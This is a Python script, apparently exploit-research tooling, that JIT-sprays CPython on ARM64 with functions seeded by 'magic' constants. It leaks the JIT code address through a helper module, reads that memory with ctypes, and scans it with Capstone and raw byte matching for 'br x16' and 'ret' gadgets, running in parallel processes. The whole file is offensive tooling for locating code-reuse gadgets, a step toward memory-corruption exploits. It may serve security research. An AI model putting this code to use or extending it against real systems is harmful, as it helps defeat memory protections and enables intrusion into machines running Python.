import ctypes
import jitexecleak
from capstone import *
from multiprocessing import Process, set_start_method, current_process

# Capstone setup
md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
md.detail = True
interesting_mnemonics = ["ret", "br", "ldr", "mov", "cmp", "ands", "eor", "orr", "add"]
highlight_regs = ["x16", "x30"]

# Magic values for spraying
magic_values = [
    0x0000FFFF,
    0xFFFF0000,
    0xF0F0F0F0,
    0x0F0F0F0F,
    0xDEADBEEF,
    0xAAAAAAAA,
    0x55555555,
    0xFFFFFFFF,
]

# ARM64 gadget patterns in bytes (br x16, ret)
known_gadget_bytes = [
    b'\x00\x02\x1f\xd6',  # br x16
    b'\xc0\x03\x5f\xd6',  # ret
]

def make_spray_func(magic):
    def spray(x):
        acc = x
        for i in range(20000):
            acc ^= (magic & i)
            acc += (acc << 1)
            acc |= (acc >> 2)
            acc &= 0x0F0F0F0F
        return acc
    return spray

def run_magic_spray(magic):
    pid = current_process().pid
    print(f"\n=== [PID {pid}] Scanning magic: 0x{magic:08x} ===")
    spray_fn = make_spray_func(magic)

    for _ in range(6000):
        spray_fn(42)

    try:
        jit_addr = jitexecleak.leak_executor_jit(spray_fn)
        print(f"[0x{magic:08x}] executor->jit_code @ 0x{jit_addr:x}")
    except RuntimeError:
        print(f"[0x{magic:08x}] Failed to JIT.")
        return

    length = 0x1000  # 4KB scan
    mem = ctypes.string_at(jit_addr, length)

    print(f"[0x{magic:08x}] Disassembling 0x{jit_addr:x} - 0x{jit_addr+length:x}")
    for i in md.disasm(mem, jit_addr):
        if i.mnemonic in interesting_mnemonics or any(r in i.op_str for r in highlight_regs):
            print(f"  [GADGET] 0x{i.address:x}: {i.mnemonic:<6} {i.op_str}")

    # Raw byte scan
    raw = bytearray(mem)
    for i in range(len(raw) - 4):
        chunk = raw[i:i+4]
        if chunk in known_gadget_bytes:
            abs_addr = jit_addr + i
            print(f"  [RAW-GADGET] found: {chunk.hex()} @ 0x{abs_addr:x}")

if __name__ == "__main__":
    try:
        set_start_method("fork")
    except RuntimeError:
        pass

    procs = []
    for magic in magic_values:
        p = Process(target=run_magic_spray, args=(magic,))
        p.start()
        procs.append(p)

    for p in procs:
        p.join()
